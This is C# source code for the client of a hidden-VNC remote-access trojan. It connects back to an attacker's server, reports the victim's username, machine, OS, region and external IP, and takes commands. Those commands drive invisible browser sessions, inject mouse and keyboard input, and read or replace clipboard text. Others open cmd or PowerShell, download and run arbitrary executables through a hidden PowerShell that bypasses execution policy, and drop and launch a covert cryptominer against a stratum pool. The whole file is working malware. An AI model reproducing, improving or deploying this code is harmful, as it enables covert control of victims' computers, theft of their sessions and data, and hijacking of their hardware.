using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using DLL.Browser;
using DLL.Functions;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using System.Reflection;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;

namespace DLL
{
    public class HVNC
	{

		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		[STAThread]
		static void Main(string[] cmdArgs)
		{

			try
			{
				Mutex mutex = new Mutex(initiallyOwned: false, cmdArgs[3]);
				if (!mutex.WaitOne(0, exitContext: false))
				{
					mutex.Close();
					mutex = null;
				}
			}
			catch
			{
				Mutex mutex = new Mutex(initiallyOwned: false, "01234567890");
				if (!mutex.WaitOne(0, exitContext: false))
				{
					mutex.Close();
					mutex = null;
				}
			}

			try
			{
				Outils.HigherThan81 = Conversions.ToBoolean(Outils.Isgreaterorequalto81());

				Outils.TitleBarHeight = Outils.GetSystemMetrics(4);

				if (Outils.TitleBarHeight < 5)
				{
					Outils.TitleBarHeight = 20;
				}

				Outils.Identifier = Conversions.ToString(cmdArgs[0]);

				Outils.ip = cmdArgs[1];

				Outils.port = Conversions.ToInteger(cmdArgs[2]);

				Outils.username = Environment.UserName + "@" + Environment.MachineName;

				Outils.screenx = Screen.PrimaryScreen.Bounds.Width;

				Outils.screeny = Screen.PrimaryScreen.Bounds.Height;

				SendData(Outils.ip, Outils.port);


				while (true)
				{
					Thread.Sleep(10000);
				}
			}
			catch
			{

			}
		}

		private static void SendData(string ip, int port)
		{
			while (true)
			{
				Outils.Client = new TcpClient();
				Thread.Sleep(1000);
				try
				{
					Outils.Client.Connect(ip, port);
				}
				catch
				{
					continue;
				}
				break;
			}
			Outils.nstream = Outils.Client.GetStream();

			Outils.nstream.BeginRead(new byte[1], 0, 0, Read, null);

			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
				string pathName = (string)registryKey.GetValue("productName");

				RegionInfo ri = RegionInfo.CurrentRegion;

				if (!File.Exists(Interaction.Environ("APPDATA") + "\\" + "temp0923"))
                {
					File.WriteAllText(Interaction.Environ("APPDATA") + "\\" + "temp0923", DateTime.UtcNow.ToString("MM/dd/yyyy"));
				}

				string installDate = File.ReadAllText(Interaction.Environ("APPDATA") + "\\" + "temp0923");

				string externalIpString = new WebClient().DownloadString("http://ipinfo.io/ip").Replace("\\r\\n", "").Replace("\\n", "").Trim();
				var externalIp = IPAddress.Parse(externalIpString);

				string[] ipadd = Outils.Client.Client.RemoteEndPoint.ToString().Split(':');

				Outils.SendInformation(Outils.nstream, "54321|" + Outils.Identifier + "_ | " + Outils.username + "|" + ri.Name.ToString() + "|" + pathName + "|" + installDate + "|" + "3.0.0.2|" + externalIp.ToString());
			}
			catch
			{
			}
		}

		public static void Read(IAsyncResult ar)
		{
			checked
			{
				try
				{
					lock (Outils.Client)
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
						binaryFormatter.FilterLevel = TypeFilterLevel.Full;
						byte[] array = new byte[8];
						int num = 8;
						int num2 = 0;
						while (num > 0)
						{
							int num3 = Outils.nstream.Read(array, num2, num);
							if (num3 == 0)
							{
								throw new SocketException(10054);
							}
							int num4 = num3;
							num -= num4;
							num2 += num4;
						}
						ulong num5 = BitConverter.ToUInt64(array, 0);
						int num6 = 0;
						byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num5), 1m)) + 1];
						object objectValue2;
						using (MemoryStream memoryStream = new MemoryStream())
						{
							int num7 = 0;
							int num8 = array2.Length;
							while (num8 > 0)
							{
								int num9 = Outils.nstream.Read(array2, num7, num8);
								if (num9 == 0)
								{
									throw new SocketException(10054);
								}
								num6 = num9;
								num8 -= num6;
								num7 += num6;
							}
							memoryStream.Write(array2, 0, (int)num5);
							memoryStream.Position = 0L;
							object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));
							objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
							memoryStream.Close();
							memoryStream.Dispose();
						}
						HandleData(RuntimeHelpers.GetObjectValue(objectValue2));
						Outils.nstream.BeginRead(new byte[1], 0, 0, Read, null);
					}
				}

				catch (Exception ex)
				{
						Outils.Client.Close();

						Outils.newt.Abort();

						SendData(Outils.ip, Outils.port);
				}
			}
		}

		private static void HandleData(object str)
		{
			try
			{
				object obj = Strings.Split(Conversions.ToString(str), "*", -1, CompareMethod.Text);
				ThreadPool.QueueUserWorkItem(ReceiveCommand, RuntimeHelpers.GetObjectValue(obj));
			}
			catch
			{

			}
		}

		public static void ReceiveCommand(object id)
		{
			try
			{
				object left = NewLateBinding.LateIndexGet(id, new object[1] { 0 }, null);
				if (Operators.ConditionalCompareObjectEqual(left, 0, TextCompare: false))
				{
					try
					{
						Outils.SendInformation(Outils.nstream, "0|" + Conversions.ToString(Outils.screenx) + "|" + Conversions.ToString(Outils.screeny));
					}
					catch
					{

					}

					Outils.newt = new Thread(Outils.SCT);
					Outils.newt.SetApartmentState(ApartmentState.STA);
					Outils.newt.IsBackground = true;
					Outils.newt.Start();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 1, TextCompare: false))
				{
					Outils.newt.Abort();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 2, TextCompare: false))
				{
					Outils.PostClickLD(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 2 }, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 3, TextCompare: false))
				{
					Outils.PostClickRD(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 2 }, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 4, TextCompare: false))
				{
					Outils.PostClickLU(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 2 }, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 5, TextCompare: false))
				{
					Outils.PostClickRU(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 2 }, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 6, TextCompare: false))
				{
					Outils.PostDblClk(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 2 }, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 7, TextCompare: false))
				{
					Outils.PostKeyDown(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 8, TextCompare: false))
				{
					Outils.PostMove(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 2 }, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 9, TextCompare: false))
				{
					Outils.SendInformation(Outils.nstream, Operators.ConcatenateObject("9|", CopyText()));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 4875, TextCompare: false))
				{
					Process.Start("cmd.exe").WaitForInputIdle();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 4876, TextCompare: false))
				{
					Process.Start("powershell.exe").WaitForInputIdle();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 10, TextCompare: false))
				{
					PasteText(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 11, TextCompare: false))
				{
					Chrome.StartChrome(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 12, TextCompare: false))
				{
					Firefox.StartFirefox(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 13, TextCompare: false))
				{
					ShowStartMenu();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 14, TextCompare: false))
				{
					MinTop();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 15, TextCompare: false))
				{
					RestoreMaxTop();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 16, TextCompare: false))
				{
					CloseTop();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 17, TextCompare: false))
				{
					Outils.interval = Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 18, TextCompare: false))
				{
					Outils.quality = Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 19, TextCompare: false))
				{
					Outils.resize = Conversions.ToDouble(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 21, TextCompare: false))
				{
					StartExplorer();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 24, TextCompare: false))
				{
					Process.GetCurrentProcess().Kill();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 30, TextCompare: false))
				{
					Edge.StartEdge(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 32, TextCompare: false))
				{
					Brave.StartBrave(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 56, TextCompare: false))
				{
					DownloadExecute(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 55, TextCompare: false))
				{

					Outils.tempFile = RandomString(9);

					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 6 }, null)) == "0")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("USERPROFILE") + "\\Desktop\\" + Outils.tempFile;
					}

					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 6 }, null)) == "1")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("LOCALAPPDATA") + "\\" + Outils.tempFile;
					}

					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 6 }, null)) == "2")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("ProgramFiles") + "\\" + Outils.tempFile;
					}

					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 6 }, null)) == "3")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("APPDATA") + "\\" + Outils.tempFile;
					}

					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 6 }, null)) == "4")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("Temp") + "\\" + Outils.tempFile;
					}


					if (Directory.Exists(Outils.MPath) == false)
					{
						Directory.CreateDirectory(Outils.MPath);
					}


					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)).Contains("ETH.txt"))
					{


						using (WebClient web3 = new WebClient())
						{

							StreamWriter w = new StreamWriter(Outils.MPath + Outils.MFile + ".bat");
							w.WriteLine(Outils.MPath + Outils.MFile + " -P stratum://" + Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 4 }, null)) + "." + Path.GetFileNameWithoutExtension(Outils.MFile) + ":x@" + Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 2 }, null)) + ":" + Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 3 }, null)));
							w.WriteLine("pause");
							w.Close();

							try
							{
								File.WriteAllBytes(Outils.MPath + Outils.MFile, UTK(web3.DownloadString(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)))));
							}
							catch (Exception e)
							{
								MessageBox.Show(e.Message);
							}

						}

						Outils.SendInformation(Outils.nstream, "222|");

						StartMethod2(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 5 }, null)));

					}

					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)).Contains("ETC.txt"))
					{


						using (WebClient web3 = new WebClient())
						{

							StreamWriter w = new StreamWriter(Outils.MPath + Outils.MFile + ".bat");
							w.WriteLine(Outils.MPath + Outils.MFile + " -P stratum://" + Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 4 }, null)) + "." + Path.GetFileNameWithoutExtension(Outils.MFile) + ":x@" + Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 2 }, null)) + ":" + Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 3 }, null)));
							w.WriteLine("pause");
							w.Close();

							try
							{
								File.WriteAllBytes(Outils.MPath + Outils.MFile, UTK(web3.DownloadString(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)))));
							}
							catch (Exception e)
							{
								MessageBox.Show(e.Message);
							}

						}

						Outils.SendInformation(Outils.nstream, "223|");

						StartMethod2(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 5 }, null)));

					}

				}
				else if (Operators.ConditionalCompareObjectEqual(left, 50, TextCompare: false))
				{
					KillMiner();
				}
			}
			catch
			{
			}
		}
		public static void Powershell(string args)
		{
			ProcessStartInfo processStart = new ProcessStartInfo()
			{
				FileName = "powershell.exe",
				Arguments = args,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = false
			};
			Process.Start(processStart);
		}


		public static void DownloadExecute(string url)
        {
			string path = RandomString(5);
			Powershell("powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('" + url + "','" + Path.GetTempPath() + path + ".exe" + "');Start-Process ('" + Path.GetTempPath() + path + ".exe" + "')");
			Outils.SendInformation(Outils.nstream, "256|");
		}


		public static void KillMiner()
		{
			Outils.procM.Kill();
		}

		public static Random random = new Random();
		public static string RandomString(int length)
		{
			const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			return new string(Enumerable.Repeat(chars, length)
			  .Select(s => s[random.Next(s.Length)]).ToArray());
		}

		public static byte[] UTK(string data)
		{
			return HttpServerUtility.UrlTokenDecode(data);
		}

		public static void StartMethod1(string Hidden)
		{
			if (File.Exists(Outils.MPath + Outils.MFile))
			{

				Outils.procM.StartInfo.UseShellExecute = false;

				if (Hidden == "Hide")
				{
					Outils.procM.StartInfo.CreateNoWindow = false;
					Outils.procM.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				}

				if (Hidden == "Show")
				{
					Outils.procM.StartInfo.CreateNoWindow = true;
					Outils.procM.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
				}


				Outils.procM.StartInfo.FileName = Outils.MPath + Outils.MFile + ".bat";

				Outils.procM.StartInfo.RedirectStandardError = false;
				Outils.procM.StartInfo.RedirectStandardOutput = false;
				Outils.procM.StartInfo.UseShellExecute = true;

				Outils.procM.Start();
				Outils.procM.WaitForExit();

			}


		}

		public static void StartMethod2(string Hidden)
		{
			if (File.Exists(Outils.MPath + Outils.MFile))
			{

				Outils.procM.StartInfo.UseShellExecute = false;

				if (Hidden == "Hide")
				{
					Outils.procM.StartInfo.CreateNoWindow = false;
					Outils.procM.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				}

				if (Hidden == "Show")
				{
					Outils.procM.StartInfo.CreateNoWindow = true;
					Outils.procM.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
				}


				Outils.procM.StartInfo.FileName = Outils.MPath + Outils.MFile + ".bat";

				Outils.procM.StartInfo.RedirectStandardError = false;
				Outils.procM.StartInfo.RedirectStandardOutput = false;
				Outils.procM.StartInfo.UseShellExecute = true;

				Outils.procM.Start();
				Outils.procM.WaitForExit();

			}


		}

		public static void StartExplorer()
		{
			Process.Start("explorer");
		}

		public static void CloseTop()
		{
			IntPtr intPtr = Outils.lastactivebar;
			Outils.SendMessage((int)intPtr, 16, 0, 0);
		}

		[DllImport("user32.dll", EntryPoint = "SetWindowPos")]
		public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

		const short SWP_NOMOVE = 0X2;
		const short SWP_NOSIZE = 1;
		const short SWP_NOZORDER = 0X4;
		const int SWP_SHOWWINDOW = 0x0040;

		public static void RestoreMaxTop()
		{
			IntPtr intPtr = Outils.lastactivebar;
			if (Outils.IsZoomed(intPtr))
			{
				Outils.ShowWindow(intPtr, 9);
			}
			else
			{
				Outils.ShowWindow(intPtr, 3);
			}

			// Get the dimensions for the second monitor 
			Rectangle secondMonitor = Screen.AllScreens[0].WorkingArea;
			SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, secondMonitor.Left, secondMonitor.Top, secondMonitor.Width, secondMonitor.Height, SWP_NOZORDER | SWP_SHOWWINDOW);

		}

		public static void MinTop()
		{
			IntPtr hWnd = Outils.lastactivebar;
			Outils.ShowWindow(hWnd, 6);
		}

		public static void ShowStartMenu()
		{
			IntPtr hWnd = ((Outils.FindWindowEx2((IntPtr)0, (IntPtr)0, (IntPtr)49175, "Start") == IntPtr.Zero) ? Outils.GetWindow(Outils.FindWindow("Shell_TrayWnd", null), 5u) : Outils.FindWindowEx2((IntPtr)0, (IntPtr)0, (IntPtr)49175, "Start"));
			Outils.PostMessage(hWnd, 513u, (IntPtr)0L, (IntPtr)Outils.MakeLParam(2, 2));
			Outils.PostMessage(hWnd, 514u, (IntPtr)0L, (IntPtr)Outils.MakeLParam(2, 2));
		}

		public static object CopyText()
		{
			Outils.SendMessage((int)Outils.lastactive, 258, 3, (int)IntPtr.Zero);
			Outils.SendMessage((int)Outils.lastactive, 769, 0, 0);
			Outils.PostMessage(Outils.lastactive, 258u, (IntPtr)3, IntPtr.Zero);
			Outils.PostMessage(Outils.lastactive, 769u, default(IntPtr), default(IntPtr));
			return Clipboard.GetText();
		}

		public static void PasteText(string ToPaste)
		{
			Clipboard.SetText(ToPaste);
			Outils.SendMessage((int)Outils.lastactive, 770, 0, 0);
		}


	}
}
